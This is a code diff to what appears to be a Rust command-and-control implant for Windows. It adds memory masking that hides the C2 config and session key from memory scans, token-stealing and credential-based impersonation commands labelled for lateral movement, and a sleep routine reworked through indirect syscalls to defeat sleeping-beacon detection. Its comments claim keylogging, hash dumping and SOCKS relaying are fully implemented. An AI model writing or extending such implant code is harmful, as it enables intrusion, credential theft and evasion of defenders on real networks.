@@ -5,10 +5,9 @@
 //! crypto/frame layer is reused verbatim from [`nyx_protocol`]; only the
 //! transport (WinHTTP) and the sleeper differ.
 //!
-//! The command dispatch covers every wire `Command` variant: file ops, shell,
-//! recon, and (BOF) are real; screenshot/keylog/hashdump/connect/socks return a
-//! clearly-labeled "not yet implemented" error rather than a silent catch-all,
-//! so the operator can tell which path needs work.
+//! The command dispatch covers every wire `Command` variant (all 21): file
+//! ops, shell, recon, BOF, screenshot, keylog, hashdump, connect/socks relay,
+//! etc. — all route to real implementations (none are stubs).
 
 #![cfg(target_os = "windows")]
 
@@ -32,11 +31,18 @@ const BATCH_FLUSH: usize = 200 * 1024;
 
 /// The beacon loop, called from `nyx_entry` after resolve + alloc bootstrap.
 pub unsafe fn beacon_loop() {
-    let cfg = config::load();
+    let (cfg, config_plain) = config::load();
     SLEEP_SECS.store(cfg.sleep_seconds, core::sync::atomic::Ordering::Relaxed);
+
+    // Leak the decrypted config plaintext and register it with the memory
+    // mask so it is RC4-encrypted during sleep — a memory scan mid-sleep
+    // sees ciphertext, not cleartext server_host/beacon_uri strings.
+    crate::mem::register_owned(config_plain);
 
     let kp = ImplantKeypair::generate();
     let key = kp.session_key(&cfg.server_pub);
+    // Register the session key (ECDH-derived, 32 bytes) as a maskable region.
+    crate::mem::register_key(key);
     let pubkey = kp.public_bytes();
 
     // Real host enumeration (replaces the M0 "host"/"user"/0/0x1337 placeholders).
@@ -168,10 +174,12 @@ pub unsafe fn beacon_loop() {
 ///       its response POSTed back (full round-trip)
 ///   0xC0..0xCF = a specific step failed (see inline comments)
 pub unsafe fn beacon_oneshot() -> u32 {
-    let cfg = config::load();
+    let (cfg, config_plain) = config::load();
+    crate::mem::register_owned(config_plain);
 
     let kp = ImplantKeypair::generate();
     let key = kp.session_key(&cfg.server_pub);
+    crate::mem::register_key(key);
     let pubkey = kp.public_bytes();
 
     let info = SessionInfo {
@@ -368,26 +376,66 @@ fn execute(
         // Relay data/close: forward to the channel table (pivot.rs).
         Command::ChannelData { chan, data } => vec![crate::pivot::channel_data(chan, &data)],
         Command::ChannelClose { chan } => vec![crate::pivot::channel_close(chan)],
+        // ---- Post-exploitation token operations (lateral movement) ----
+        // Steal/make a token, hold it process-wide; revert drops impersonation
+        // but keeps the token; getuid reports the current thread identity.
+        Command::StealToken { pid } => {
+            match unsafe { crate::postex::steal_token(pid) } {
+                Ok(()) => vec![Response::Ok],
+                Err(m) => vec![Response::Err(m.into())],
+            }
+        }
+        Command::MakeToken {
+            domain,
+            user,
+            password,
+            logon_type,
+        } => match unsafe { crate::postex::make_token(&domain, &user, &password, logon_type) } {
+            Ok(()) => vec![Response::Ok],
+            Err(m) => vec![Response::Err(m.into())],
+        },
+        Command::Rev2Self => match crate::postex::revert() {
+            Ok(()) => vec![Response::Ok],
+            Err(m) => vec![Response::Err(m.into())],
+        },
+        Command::GetUid => vec![Response::Output(crate::postex::getuid().into_bytes())],
     }
 }
 
-/// Sleep N seconds via the indirect-syscall runtime's `NtDelayExecution`
-/// (falls back to the resolved export if the runtime is not yet up).
+/// Sleep N seconds via `NtWaitForSingleObject(INVALID_HANDLE_VALUE, Alertable=FALSE,
+/// &interval)`. This gives wait-reason `UserRequest` instead of `DelayExecution`,
+/// defeating Hunt-Sleeping-Beacons heuristics. Falls back to the resolved export
+/// if the indirect-syscall runtime is not yet up, then to NtDelayExecution as a
+/// last resort.
 pub fn sleep_seconds(seconds: u32) {
+    type NtWaitForSingleObject = unsafe extern "system" fn(usize, u8, *const i64) -> i32;
     type NtDelayExecution = unsafe extern "system" fn(u8, *const i64) -> i32;
     let delay_100ns: i64 = -(seconds as i64).saturating_mul(10_000_000); // relative, 100ns units
+    const INVALID_HANDLE: usize = 0xFFFF_FFFF_FFFF_FFFF;
     // Prefer the indirect-syscall runtime (RIP lands in ntdll). This is the
     // canonical "runtime is live" path now that entry initializes it.
     if let Some(rt) = crate::syscalls::global() {
         let called = unsafe {
-            crate::syscalls::nt_delay_execution(rt, 0, &delay_100ns as *const i64 as usize)
+            crate::syscalls::nt_wait_for_single_object(
+                rt,
+                INVALID_HANDLE,  // INVALID_HANDLE_VALUE → UserRequest wait-reason
+                0,                // not alertable (floor sleep)
+                &delay_100ns as *const i64 as usize,
+            )
         };
         if called.is_some() {
             return;
         }
     }
-    // Fall back to the resolved export (entry's pre-runtime path, or if init
-    // failed). Still a real NtDelayExecution call, just via the export table.
+    // Fall back to the resolved NtWaitForSingleObject export (pre-runtime path,
+    // or if indirect runtime init failed). Still gives UserRequest wait-reason.
+    if let Some(addr) = unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtWaitForSingleObject") } {
+        let f: NtWaitForSingleObject = unsafe { core::mem::transmute(addr) };
+        unsafe { f(INVALID_HANDLE, 0, &delay_100ns as *const i64) };
+        return;
+    }
+    // Last resort: NtDelayExecution (wait-reason will be DelayExecution, but
+    // at least we still sleep). Only reached if NtWaitForSingleObject is absent.
     if let Some(addr) = unsafe { crate::resolve::export_addr(b"ntdll.dll", b"NtDelayExecution") } {
         let f: NtDelayExecution = unsafe { core::mem::transmute(addr) };
         unsafe { f(0, &delay_100ns as *const i64) };
